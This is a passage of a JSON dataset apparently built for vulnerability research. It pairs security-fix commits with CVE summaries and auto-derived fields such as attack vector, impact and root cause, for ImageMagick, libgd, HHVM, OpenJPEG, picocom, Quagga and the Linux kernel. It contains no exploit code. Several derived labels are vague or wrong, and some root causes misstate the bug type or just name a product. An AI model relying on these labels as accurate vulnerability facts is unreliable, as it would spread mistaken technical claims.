attacker"},{"commit_id":"f473e355e1dc422c4f019dbf86bc50ba1a34a766","cve_id":"CVE-2016-7144","cwe_id":"CWE-287","commit_message":"Fix AUTHENTICATE bug","summary":"The m_authenticate function in modules\/m_sasl.c in UnrealIRCd before 3.2.10.7 and 4.x before 4.0.6 allows remote attackers to spoof certificate fingerprints and consequently log in as another user via a crafted AUTHENTICATE parameter.","commit_message_1":"fix authenticate bug","Vulnerability Type":"Improper Authentication","Attack Vector":"via a crafted authenticate parameter","Impact":"spoof certificate fingerprints and consequently log in as another user","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"7afcf9f71043df15508e46f079387bd4689a738d","cve_id":"CVE-2016-7101","cwe_id":"CWE-125","commit_message":"Prevent buffer overflow in BMP & SGI coders (bug report from pwchen&rayzhong of tencent)","summary":"The SGI coder in ImageMagick before 7.0.2-10 allows remote attackers to cause a denial of service (out-of-bounds read) via a large row value in an sgi file.","commit_message_1":"prevent buffer overflow in bmp & sgi coder ( bug report from pwchen & rayzhong of tencent )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a large row value in an sgi file","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote attacker"},{"commit_id":"a49feeae76d41959d85ee733925a4cf40bac61b2","cve_id":"CVE-2016-6912","cwe_id":"CWE-415","commit_message":"Fix double-free in gdImageWebPtr()\n\nThe issue is that gdImageWebpCtx() (which is called by gdImageWebpPtr() and\nthe other WebP output functions to do the real work) does not return whether\nit succeeded or failed, so this is not checked in gdImageWebpPtr() and the\nfunction wrongly assumes everything is okay, which is not, in this case,\nbecause there is a size limitation for WebP, namely that the width and\nheight must by less than 16383.\n\nWe can't change the signature of gdImageWebpCtx() for API compatibility\nreasons, so we introduce the static helper _gdImageWebpCtx() which returns\nsuccess respective failure, so gdImageWebpPtr() and gdImageWebpPtrEx() can\ncheck the return value. We leave it solely to libwebp for now to report\nwarnings regarding the failing write.\n\nThis issue had been reported by Ibrahim El-Sayed to security@libgd.org.\n\nCVE-2016-6912","summary":"Double free vulnerability in the gdImageWebPtr function in the GD Graphics Library (aka libgd) before 2.2.4 allows remote attackers to have unspecified impact via large width and height values.","commit_message_1":"fix double-free in gdimagewebptr ( ) the issue is that gdimagewebpctx ( ) ( which is called by gdimagewebpptr ( ) and the other webp output function to do the real work ) doe not return whether it succeeded or failed , so this is not checked in gdimagewebpptr ( ) and the function wrongly assumes everything is okay , which is not , in this case , because there is a size limitation for webp , namely that the width and height must by le than <number>","Vulnerability Type":"double free","Attack Vector":"via large width and height values","Impact":"have unspecified impact","Root Cause":"by using large width and height values","Attack Type":"remote attacker"},{"commit_id":"4859d69e07504d4b0a4bdf9bcb4d9e3769ca35ae","cve_id":"CVE-2016-6911","cwe_id":"CWE-125","commit_message":"Fix invalid read in gdImageCreateFromTiffPtr()\n\ntiff_invalid_read.tiff is corrupt, and causes an invalid read in\ngdImageCreateFromTiffPtr(), but not in gdImageCreateFromTiff(). The culprit\nis dynamicGetbuf(), which doesn't check for out-of-bound reads. In this case,\ndynamicGetbuf() is called with a negative dp->pos, but also positive buffer\noverflows have to be handled, in which case 0 has to be returned (cf. commit\n75e29a9).\n\nFixing dynamicGetbuf() exhibits that the corrupt TIFF would still create\nthe image, because the return value of TIFFReadRGBAImage() is not checked.\nWe do that, and let createFromTiffRgba() fail if TIFFReadRGBAImage() fails.\n\nThis issue had been reported by Ibrahim El-Sayed to security@libgd.org.\n\nCVE-2016-6911","summary":"The dynamicGetbuf function in the GD Graphics Library (aka libgd) before 2.2.4 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted TIFF image.","commit_message_1":"fix invalid read in gdimagecreatefromtiffptr ( ) <file> is corrupt , and cause an invalid read in gdimagecreatefromtiffptr ( ) , but not in gdimagecreatefromtiff ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted tiff image","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by a missing check for out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"fb0e0cce0b9f25389ab56604c3547351617e1415","cve_id":"CVE-2016-6906","cwe_id":"CWE-125","commit_message":"Fix OOB reads of the TGA decompression buffer\n\nIt is possible to craft TGA files which will overflow the decompression\nbuffer, but not the image's bitmap. Therefore we augment the check for the\nbitmap's overflow with a check for the buffer's overflow.\n\nThis issue had been reported by Ibrahim El-Sayed to security@libgd.org.\n\nCVE-2016-6906","summary":"The read_image_tga function in gd_tga.c in the GD Graphics Library (aka libgd) before 2.2.4 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted TGA file, related to the decompression buffer.","commit_message_1":"fix oob read of the tga decompression buffer it is possible to craft tga file which will overflow the decompression buffer , but not the image 's bitmap","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted tga file , related to the decompression buffer","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote attacker"},{"commit_id":"1888810e77b446a79a7674784d5f139fcfa605e2","cve_id":"CVE-2016-6875","cwe_id":null,"commit_message":"Fix infinite recursion in wddx\n\nSummary:\nIt wasn't checking for infinite recursion due to references or self-referential\nobjects. As it turns out closures always return themselves when converted to an\narray. Raising a warning and returning is how PHP-src deals with this problem,\nnothing special is done for closures.\n\nReviewed By: alexmalyshev\n\nDifferential Revision: D3465655\n\nfbshipit-source-id: a42bc34d30cf4825faf33596139c0c05f8e4f5f1","summary":"Infinite recursion in wddx in Facebook HHVM before 3.15.0 allows attackers to have unspecified impact via unknown vectors.","commit_message_1":"fix infinite recursion in wddx summary : it wa n't checking for infinite recursion due to reference or self-referential object","Vulnerability Type":"Infinite recursion","Attack Vector":"has unknown attack vector","Impact":"have unspecified impact","Root Cause":"Infinite recursion","Attack Type":"attacker"},{"commit_id":"05e706d98f748f609b19d8697e490eaab5007d69","cve_id":"CVE-2016-6874","cwe_id":null,"commit_message":"Fix recursion checks in array_*_recursive\n\nSummary:\narray_merge_recursive and array_replace_recursive do recursion checks,\nbut use the fact that normal arrays can't contain cycles except\nthrough references to avoid most of the checking.\n\nUnfortunately the $GLOBALS array is special, and \/can\/ contain cycles\nwithout references, and ProxyArrays could potentially do the same (via\nan as-yet unimplemented extension).\n\nReviewed By: mxw\n\nDifferential Revision: D3622612\n\nfbshipit-source-id: ed90b747096a05919a80c4793e2a2b7c57584d56","summary":"The array_*_recursive functions in Facebook HHVM before 3.15.0 allows attackers to have unspecified impact via unknown vectors, related to recursion.","commit_message_1":"fix recursion check in array_ * _recursive summary : array_merge_recursive and array_replace_recursive do recursion check , but use the fact that normal array ca n't contain cycle except through reference to avoid most of the checking","Vulnerability Type":"unspecified","Attack Vector":"has unknown attack vector","Impact":"have unspecified impact","Root Cause":"A flaw","Attack Type":"attacker"},{"commit_id":"e264f04ae825a5d97758130cf8eec99862517e7e","cve_id":"CVE-2016-6873","cwe_id":null,"commit_message":"Fix self recursion in compact\n\nSummary: There were no checks at all.\n\nReviewed By: alexmalyshev\n\nDifferential Revision: D3623763\n\nfbshipit-source-id: 9d708deca05bbd121503e8f323b4f295fde8e835","summary":"Self recursion in compact in Facebook HHVM before 3.15.0 allows attackers to have unspecified impact via unknown vectors.","commit_message_1":"fix self recursion in compact summary : there were no check at all","Vulnerability Type":"unspecified","Attack Vector":"has unknown attack vector","Impact":"have unspecified impact","Root Cause":"Self recursion","Attack Type":"attacker"},{"commit_id":"2c9a8fcc73a151608634d3e712973d192027c271","cve_id":"CVE-2016-6872","cwe_id":"CWE-190","commit_message":"Fix integer overflow in StringUtil::implode\n\nReviewed By: ricklavoie\n\nDifferential Revision: D3623922\n\nfbshipit-source-id: 136d124a850c07cc6c63535afc11d36499d576fc","summary":"Integer overflow in StringUtil::implode in Facebook HHVM before 3.15.0 allows attackers to have unspecified impact via unknown vectors.","commit_message_1":"fix integer overflow in stringutil : :implode","Vulnerability Type":"integer overflow","Attack Vector":"via unknown vectors","Impact":"have unspecified impact","Root Cause":"caused by a flaw","Attack Type":"attacker"},{"commit_id":"c00fc9d3003eb06226b58b6a48555f1456ee2475","cve_id":"CVE-2016-6871","cwe_id":"CWE-190","commit_message":"Fix buffer overrun due to integer overflow in bcmath\n\nSummary: scale gets passed around as an int inside the library.\n\nReviewed By: mxw\n\nDifferential Revision: D3624520\n\nfbshipit-source-id: d39927413cec24fda2e475a296ad5d9019ccef0a","summary":"Integer overflow in bcmath in Facebook HHVM before 3.15.0 allows attackers to have unspecified impact via unknown vectors, which triggers a buffer overflow.","commit_message_1":"fix buffer overrun due to integer overflow in bcmath summary : scale get passed around a an int inside the library","Vulnerability Type":"integer overflow","Attack Vector":"via unknown vectors","Impact":"have unspecified impact","Root Cause":"caused by an integer overflow","Attack Type":"attacker"},{"commit_id":"365abe807cab2d60dc9ec307292a06181f77a9c2","cve_id":"CVE-2016-6870","cwe_id":"CWE-787","commit_message":"Use req::strndup in php_mb_parse_encoding_list to prevent oob memory write.\n\nSummary:\nFix out of bounds write access in mb_detect_encoding.  Using strndup in\nphp_mb_parse_encoding_list will cause strings with embedded nulls to be\nunexpectedly shortened.  The expected length of the string is tracked in\nvalue_length but since strndup may copy fewer characters when there are\nmbedded null this can lead to oob writes into tmpstr.\n\nI've found a couple other places in this file that use strndup and replaced\nthem with req::strndup as well.  The use of strndup in mb_send_mail also seemed\nto be a leak.\n\nThis replaces uses of strndup with req::strndup which can handle embedded\nnulls properly.\n\nIt looks like I also accidentally fixed t11337047 at the same time.  Adding it to the list of tasks.\n\nReviewed By: paulbiss\n\nDifferential Revision: D3360065\n\nfbshipit-source-id: 99776cf9105e3789883380bf30240009eec52cec","summary":"Out-of-bounds write in the (1) mb_detect_encoding, (2) mb_send_mail, and (3) mb_detect_order functions in Facebook HHVM before 3.15.0 allows attackers to have unspecified impact via unknown vectors.","commit_message_1":"in php_mb_parse_encoding_list to prevent oob memory write","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"unknown attack vector","Impact":"have unspecified impact","Root Cause":"Out-of-bounds write errors","Attack Type":"attacker"},{"commit_id":"4cc6ec8a4197d4c008577127736bf7985d632323","cve_id":"CVE-2016-6823","cwe_id":"CWE-190","commit_message":"Prevent buffer overflow in BMP coder (bug report from pwchen of tencent).","summary":"Integer overflow in the BMP coder in ImageMagick before 7.0.2-10 allows remote attackers to cause a denial of service (crash) via crafted height and width values, which triggers an out-of-bounds write.","commit_message_1":"prevent buffer overflow in bmp coder ( bug report from pwchen of tencent )","Vulnerability Type":"integer overflow","Attack Vector":"via crafted height and width values , which triggers an out - of - bounds write","Impact":"cause a denial of service ( crash )","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote attacker"},{"commit_id":"6d1c73b5858fefc6161c7d686345f0dc887ea799","cve_id":"CVE-2016-6561","cwe_id":"CWE-476","commit_message":"7483 SMB flush on pipe triggers NULL pointer dereference in module smbsrv\nReviewed by: Gordon Ross <gwr@nexenta.com>\nReviewed by: Matt Barden <matt.barden@nexenta.com>\nReviewed by: Evan Layton <evan.layton@nexenta.com>\nReviewed by: Dan McDonald <danmcd@omniti.com>\nApproved by: Gordon Ross <gwr@nexenta.com>","summary":"illumos smbsrv NULL pointer dereference allows system crash.","commit_message_1":"<number> smb flush on pipe trigger null pointer dereference in module smbsrv","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"illumos smbsrv NULL pointer dereference","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"bbb1e6e2f467ee4bd7b9a8c800e4f07343d7d99b","cve_id":"CVE-2016-6271","cwe_id":"CWE-254","commit_message":"Add ZRTP Commit packet hvi check on DHPart2 packet reception","summary":"The Bzrtp library (aka libbzrtp) 1.0.x before 1.0.4 allows man-in-the-middle attackers to conduct spoofing attacks by leveraging a missing HVI check on DHPart2 packet reception.","commit_message_1":"add zrtp commit packet hvi check on dhpart2 packet reception","Vulnerability Type":"Security Features","Attack Vector":"by leveraging a missing hvi check on dhpart2 packet reception ","Impact":"conduct spoofing attacks","Root Cause":"caused by a missing HVI check on DHPart2 packet reception","Attack Type":"remote attacker"},{"commit_id":"be0a01bdb83395d9f3a5ea09c1308a4f1a972cbd","cve_id":"CVE-2016-6255","cwe_id":"CWE-284","commit_message":"Don't allow unhandled POSTs to write to the filesystem by default\n\nIf there's no registered handler for a POST request, the default behaviour\nis to write it to the filesystem. Several million deployed devices appear\nto have this behaviour, making it possible to (at least) store arbitrary\ndata on them. Add a configure option that enables this behaviour, and change\nthe default to just drop POSTs that aren't directly handled.","summary":"Portable UPnP SDK (aka libupnp) before 1.6.21 allows remote attackers to write to arbitrary files in the webroot via a POST request without a registered handler.","commit_message_1":"do n't allow unhandled post to write to the filesystem by default if there 's no registered handler for a post request , the default behaviour is to write it to the filesystem","Vulnerability Type":"Improper Access Control","Attack Vector":"via a post request without a registered handler","Impact":"write to arbitrary files in the webroot","Root Cause":"Portable UPnP SDK (aka libupnp)","Attack Type":"remote attacker"},{"commit_id":"5eb9743410ce4657e9d54fef26a2ee31a1b5dd0","cve_id":"CVE-2016-6129","cwe_id":"CWE-20","commit_message":"rsa_verify_hash: fix possible bleichenbacher signature attack","summary":"The rsa_verify_hash_ex function in rsa_verify_hash.c in LibTomCrypt, as used in OP-TEE before 2.2.0, does not validate that the message length is equal to the ASN.1 encoded data length, which makes it easier for remote attackers to forge RSA signatures or public certificates by leveraging a Bleichenbacher signature forgery attack.","commit_message_1":"rsa_verify_hash : fix possible bleichenbacher signature attack","Vulnerability Type":"Improper Input Validation","Attack Vector":"by leveraging a bleichenbacher signature forgery attack","Impact":"forge rsa signatures or public certificates","Root Cause":"does not validate that the message length is equal to the asn . 1 encoded data length","Attack Type":"remote attacker"},{"commit_id":"3724cd76a28be1d6049b5537232e97ac","cve_id":"CVE-2016-5873","cwe_id":"CWE-119","commit_message":"fix bug #71719 (Buffer overflow in HTTP url parsing functions)\n\nThe parser's offset was not reset when we softfail in scheme\nparsing and continue to parse a path.\nThanks to hlt99 at blinkenshell dot org for the report.","summary":"Buffer overflow in the HTTP URL parsing functions in pecl_http before 3.0.1 might allow remote attackers to execute arbitrary code via non-printable characters in a URL.","commit_message_1":"fix bug # <number> ( buffer overflow in http url parsing function ) the parser 's offset wa not reset when we softfail in scheme parsing and continue to parse a path","Vulnerability Type":"buffer overflow","Attack Vector":"via non - printable characters in a url","Impact":"execute arbitrary code","Root Cause":"caused by improper bounds checking by the url parsing functions","Attack Type":"remote attacker"},{"commit_id":"b7c217680cda02dddced245d237ebe8c383be285","cve_id":"CVE-2016-5735","cwe_id":"CWE-190","commit_message":"Fix integer overflow in rwpng.h (CVE-2016-5735)\n\nReported by Choi Jaeseung \nFound with Sparrow (http:\/\/ropas.snu.ac.kr\/sparrow)","summary":"Integer overflow in the rwpng_read_image24_libpng function in rwpng.c in pngquant 2.7.0 allows remote attackers to have unspecified impact via a crafted PNG file, which triggers a buffer overflow.","commit_message_1":"fix integer overflow in <file> ( <cve_id> ) reported by choi jaeseung found with sparrow ( http : \/\/<file>","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted png file , which triggers a buffer overflow","Impact":"have unspecified impact","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"8f9cc62b3f9a1da9712329ddcedb9750d585505c","cve_id":"CVE-2016-4797","cwe_id":"CWE-369","commit_message":"Fix division by zero\n\nFix uclouvain\/openjpeg#733","summary":"Divide-by-zero vulnerability in the opj_tcd_init_tile function in tcd.c in OpenJPEG before 2.1.1 allows remote attackers to cause a denial of service (application crash) via a crafted jp2 file.  NOTE: this issue exists because of an incorrect fix for CVE-2014-7947.","commit_message_1":"fix division by zero","Vulnerability Type":"Divide By Zero","Attack Vector":"via a crafted jp2 file","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by divide by zero errors","Attack Type":"remote attacker"},{"commit_id":"162f6199c0cd3ec1c6c6dc65e41b2faab92b2d91","cve_id":"CVE-2016-4796","cwe_id":"CWE-119","commit_message":"Fix Heap Buffer Overflow in function color_cmyk_to_rgb\n\nFix uclouvain\/openjpeg#774","summary":"Heap-based buffer overflow in the color_cmyk_to_rgb in common\/color.c in OpenJPEG before 2.1.1 allows remote attackers to cause a denial of service (crash) via a crafted .j2k file.","commit_message_1":"fix heap buffer overflow in function color_cmyk_to_rgb","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted . j2k file","Impact":"cause a denial of service ( crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"d7a6be58edc01b1c66ecd8fcc91236bfbce0a420","cve_id":"CVE-2016-3695","cwe_id":"CWE-74","commit_message":"acpi: Disable APEI error injection if securelevel is set\n\nACPI provides an error injection mechanism, EINJ, for debugging and testing\nthe ACPI Platform Error Interface (APEI) and other RAS features. If\nsupported by the firmware, ACPI specification 5.0 and later provide for a\nway to specify a physical memory address to which to inject the error.\n\nInjecting errors through EINJ can produce errors which to the platform are\nindistinguishable from real hardware errors. This can have undesirable\nside-effects, such as causing the platform to mark hardware as needing\nreplacement.\n\nWhile it does not provide a method to load unauthenticated privileged code,\nthe effect of these errors may persist across reboots and affect trust in\nthe underlying hardware, so disable error injection through EINJ if\nsecurelevel is set.\n\nSigned-off-by: Linn Crosetto <linn@hpe.com>","summary":"The einj_error_inject function in drivers\/acpi\/apei\/einj.c in the Linux kernel allows local users to simulate hardware errors and consequently cause a denial of service by leveraging failure to disable APEI error injection through EINJ when securelevel is set.","commit_message_1":"disable apei error injection if securelevel is set acpi provides an error injection mechanism , einj , for debugging and testing the acpi platform error interface ( apei ) and other ra feature","Vulnerability Type":"Injection","Attack Vector":"By leveraging failure to disable APEI error injection through EINJ when securelevel is set","Impact":"simulate hardware errors and consequently cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"15f081c89650dccee4aa4ae66f614c3fdb268767","cve_id":"CVE-2016-3183","cwe_id":"CWE-125","commit_message":"Fix Out-Of-Bounds Read in sycc42x_to_rgb function (#745)\n\n42x Images with an odd x0\/y0 lead to subsampled component starting at the\n2nd column\/line.\nThat is offset = comp->dx * comp->x0 - image->x0 = 1\n\nFix #726","summary":"The sycc422_t_rgb function in common\/color.c in OpenJPEG before 2.1.1 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted jpeg2000 file.","commit_message_1":"fix out-of-bounds read in sycc42x_to_rgb function ( # <number> ) 42x image with an odd x0\/y0 lead to subsampled component starting at the 2nd column\/line","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted jpeg2000 file","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"140ee8d2204b383279f854802b27bdb41c1d5d1a","cve_id":"CVE-2016-3179","cwe_id":"CWE-388","commit_message":"minissdpd.c: Initialize pointers to NULL (fix)","summary":"The processRequest function in minissdpd.c in MiniSSDPd 1.2.20130907-3 allows local users to cause a denial of service (invalid free and daemon crash) via vectors related to error handling.","commit_message_1":"<file> : initialize pointer to null ( fix )","Vulnerability Type":"7PK - Errors","Attack Vector":"via vectors related to error handling .","Impact":"cause a denial of service","Root Cause":"caused by an error when handling the undefined memory contents","Attack Type":"local attacker"},{"commit_id":"b238cade9a173c6f751a34acf8ccff838a62aa47","cve_id":"CVE-2016-3178","cwe_id":"CWE-125","commit_message":"minissdpd: Fix broken overflow test (p+l > buf+n) thanks to Salva Piero","summary":"The processRequest function in minissdpd.c in MiniSSDPd 1.2.20130907-3 allows local users to cause a denial of service (out-of-bounds memory access and daemon crash) via vectors involving a negative length value.","commit_message_1":"fix broken overflow test ( p+l > buf+n ) thanks to salva piero","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via vectors involving a negative length value","Impact":"cause a denial of service ( out - of - bounds memory access and daemon crash )","Root Cause":"caused by out-of-bounds memory access of negative length values","Attack Type":"local attacker"},{"commit_id":"6fcdb8f1f538b9d63e63a5fa199c5514a15d4564","cve_id":"CVE-2016-2347","cwe_id":"CWE-190","commit_message":"Fix integer underflow vulnerability in L3 decode.\n\nMarcin 'Icewall' Noga of Cisco TALOS discovered that the level 3 header\ndecoding routines were vulnerable to an integer underflow, if the 32-bit\nheader length was less than the base level 3 header length. This could\nlead to an exploitable heap corruption condition.\n\nThanks go to Marcin Noga and Regina Wilson of Cisco TALOS for reporting\nthis vulnerability.","summary":"Integer underflow in the decode_level3_header function in lib\/lha_file_header.c in Lhasa before 0.3.1 allows remote attackers to execute arbitrary code via a crafted archive.","commit_message_1":"fix integer underflow vulnerability in l3 decode","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted archive","Impact":"execute arbitrary code","Root Cause":"caused by an integer underflow","Attack Type":"remote attacker"},{"commit_id":"cfb1fae25f8c092e0d17073eaf7bd428ce1cd546","cve_id":"CVE-2016-1245","cwe_id":"CWE-119","commit_message":"zebra: stack overrun in IPv6 RA receive code (CVE-2016-1245)\n\nThe IPv6 RA code also receives ICMPv6 RS and RA messages.\nUnfortunately, by bad coding practice, the buffer size specified on\nreceiving such messages mixed up 2 constants that in fact have\ndifferent values.\n\nThe code itself has:\n #define RTADV_MSG_SIZE 4096\nWhile BUFSIZ is system-dependent, in my case (x86_64 glibc):\n \/usr\/include\/_G_config.h:#define _G_BUFSIZ 8192\n \/usr\/include\/libio.h:#define _IO_BUFSIZ _G_BUFSIZ\n \/usr\/include\/stdio.h:# define BUFSIZ _IO_BUFSIZ\n\nFreeBSD, OpenBSD, NetBSD and Illumos are not affected, since all of them\nhave BUFSIZ == 1024.\n\nAs the latter is passed to the kernel on recvmsg(), it's possible to\noverwrite 4kB of stack -- with ICMPv6 packets that can be globally sent\nto any of the system's addresses (using fragmentation to get to 8k).\n\n(The socket has filters installed limiting this to RS and RA packets,\nbut does not have a filter for source address or TTL.)\n\nIssue discovered by trying to test other stuff, which randomly caused\nthe stack to be smaller than 8kB in that code location, which then\ncauses the kernel to report EFAULT (Bad address).\n\nSigned-off-by: David Lamparter <equinox@opensourcerouting.org>\nReviewed-by: Donald Sharp <sharpd@cumulusnetworks.com>","summary":"It was discovered that the zebra daemon in Quagga before 1.0.20161017 suffered from a stack-based buffer overflow when processing IPv6 Neighbor Discovery messages. The root cause was relying on BUFSIZ to be compatible with a message size; however, BUFSIZ is system-dependent.","commit_message_1":"stack overrun in ipv6 ra receive code ( <cve_id> ) the ipv6 ra code also receives icmpv6 r and ra message","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted IPv6 packet","Impact":"cause a denial of service","Root Cause":"caused by a stack-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"1ebc60b20fbe9a02436d5cbbf8951714e749ddb1","cve_id":"CVE-2015-9059","cwe_id":"CWE-77","commit_message":"Do not use \"\/bin\/sh\" to run external commands.\n\nPicocom no longer uses \/bin\/sh to run external commands for\nfile-transfer operations. Parsing the command line and spliting it into\narguments is now performed internally by picocom, using quoting rules\nvery similar to those of the Unix shell. Hopefully, this makes it\nimpossible to inject shell-commands when supplying filenames or\nextra arguments to the send- and receive-file commands.","summary":"picocom before 2.0 has a command injection vulnerability in the 'send and receive file' command because the command line is executed by \/bin\/sh unsafely.","commit_message_1":"do not use `` \/bin\/sh '' to run external command","Vulnerability Type":"command injection","Attack Vector":"By sending a specially-crafted request","Impact":"execute arbitrary commands","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"c3c87e770458aa004bd7ed3f29945ff436fd6511","cve_id":"CVE-2015-9004","cwe_id":"CWE-264","commit_message":"perf: Tighten (and fix) the grouping condition\n\nThe fix from 9fc81d87420d (\"perf: Fix events installation during\nmoving group\") was incomplete in that it failed to recognise that\ncreating a group with events for different CPUs is semantically\nbroken -- they cannot be co-scheduled.\n\nFurthermore, it leads to real breakage where, when we create an event\nfor CPU Y and then migrate it to form a group on CPU X, the code gets\nconfused where the counter is programmed -- triggered in practice\nas well by me via the perf fuzzer.\n\nFix this by tightening the rules for creating groups. Only allow\ngrouping of counters that can be co-scheduled in the same context.\nThis means for the same task and\/or the same cpu.\n\nFixes: 9fc81d87420d (\"perf: Fix events installation during moving group\")\nSigned-off-by: Peter Zijlstra (Intel) <peterz@infradead.org>\nCc: Arnaldo Carvalho de Melo <acme@kernel.org>\nCc: Jiri Olsa <jolsa@redhat.com>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nLink: http:\/\/lkml.kernel.org\/r\/20150123125834.090683288@infradead.org\nSigned-off-by: Ingo Molnar <mingo@kernel.org>","summary":"kernel\/events\/core.c in the Linux kernel before 3.19 mishandles counter grouping, which allows local users to gain privileges via a crafted application, related to the perf_pmu_register and perf_event_open functions.","commit_message_1":"tighten ( and fix ) the grouping condition the fix from 9fc81d87420d ( `` perf : fix event installation during moving group '' ) wa incomplete in that it failed to recognise that creating a group with event for different cpu is semantically broken -- they can not be co-scheduled","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application , related to the perf _ pmu _ register and perf _ event _ open functions","Impact":"gain privileges","Root Cause":"caused by the mishandling of counter grouping","Attack Type":"local attacker"},{"commit_id":"b8f17d08b7418204bf8a05a5c24e87b2fc395b75","cve_id":"CVE-2015-8958","cwe_id":"CWE-125","commit_message":"http:\/\/www.imagemagick.org\/discourse-server\/viewtopic.php?f=3&t=26857","summary":"coders\/sun.c in ImageMagick before 6.9.0-4 Beta allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted SUN file.","commit_message_1":"http : \/\/<file>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted sun file","Impact":"cause a denial of service ( out - of - bounds read and application crash )","Root Cause":"caused by an out-of-bounds read error on SUN files","Attack Type":"remote attacker"},{"commit_id":"bd96074b254c6607a0f7731e59f923ad19d5a46d","cve_id":"CVE-2015-8957","cwe_id":"CWE-119","commit_message":"http:\/\/www.imagemagick.org\/discourse-server\/viewtopic.php?f=3&t=26848","summary":"Buffer overflow in ImageMagick before 6.9.0-4 Beta allows remote attackers to cause a denial of service (application crash) via a crafted SUN file.","commit_message_1":"http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted sun file","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by an out-of-bounds read error on SUN files","Attack Type":"remote attacker"},{"commit_id":"97aa7d7cfd2027f6ba7ce42caf8b798541b9cdc6","cve_id":"CVE-2015-8900","cwe_id":"CWE-20","commit_message":"Fixed infinite loop and added checks for the sscanf result.","summary":"The ReadHDRImage function in coders\/hdr.c in ImageMagick 6.x and 7.x allows remote attackers to cause a denial of service (infinite loop) via a crafted HDR file.","commit_message_1":"fixed infinite loop and added check for the sscanf result","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted hdr file","Impact":"cause a denial of service ( infinite loop )","Root Cause":"caused by improper handling of HDR image","Attack Type":"remote attacker"},{"commit_id":"5b4bebaa91849c592a8448bc353ab25a54ff8c44","cve_id":"CVE-2015-8898","cwe_id":"CWE-476","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/pull\/34","summary":"The WriteImages function in magick\/constitute.c in ImageMagick before 6.9.2-4 allows remote attackers to cause a denial of service (NULL pointer dereference) via a crafted image file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/pull\/<number>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted image file","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"7b1cf5784b5bcd85aa9293ecf56769f68c037231","cve_id":"CVE-2015-8897","cwe_id":"CWE-125","commit_message":"Fixed out of bounds error in SpliceImage.","summary":"The SpliceImage function in MagickCore\/transform.c in ImageMagick before 6.9.2-4 allows remote attackers to cause a denial of service (application crash) via a crafted png file.","commit_message_1":"fixed out of bound error in spliceimage","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted png file","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by an out-of-bounds error","Attack Type":"remote attacker"},{"commit_id":"4f68e9661518463fca523c9726bb5d940a2aa6d8","cve_id":"CVE-2015-8894","cwe_id":"CWE-415","commit_message":"https:\/\/bugs.launchpad.net\/ubuntu\/+source\/imagemagick\/+bug\/1490362","summary":"Double free vulnerability in coders\/tga.c in ImageMagick 7.0.0 and later allows remote attackers to cause a denial of service (application crash) via a crafted tga file.","commit_message_1":"http : \/\/<file>","Vulnerability Type":"double free","Attack Vector":"via a crafted tga file","Impact":"cause a denial of service","Root Cause":"caused by a double free","Attack Type":"remote attacker"},{"commit_id":"2e86ae5f81da11f11673d0546efb525af02b7786","cve_id":"CVE-2015-8026","cwe_id":"CWE-119","commit_message":"Check sector and cluster size before use.\n\nOtherwise malformed FS can cause heap corruption.","summary":"Heap-based buffer overflow in the verify_vbr_checksum function in exfatfsck in exfat-utils before 1.2.1 allows remote attackers to cause a denial of service (infinite loop) or possibly execute arbitrary code via a crafted filesystem.","commit_message_1":"check sector and cluster size before use","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted filesystem","Impact":"cause a denial of service ( infinite loop ) or possibly execute arbitrary code","Root Cause":"caused by improper bounds checking by the verify_vbr_checksum function","Attack Type":"remote attacker"},{"commit_id":"4b2b64d5a6ebc84214755ebccd599baef7c1b798","cve_id":"CVE-2015-7837","cwe_id":"CWE-254","commit_message":"kexec\/uefi: copy secure_boot flag in boot params across kexec reboot\n\nKexec reboot in case secure boot being enabled does not keep the secure\nboot mode in new kernel, so later one can load unsigned kernel via legacy\nkexec_load.  In this state, the system is missing the protections provided\nby secure boot. Adding a patch to fix this by retain the secure_boot flag\nin original kernel.\n\nsecure_boot flag in boot_params is set in EFI stub, but kexec bypasses the\nstub. Fixing this issue by copying secure_boot 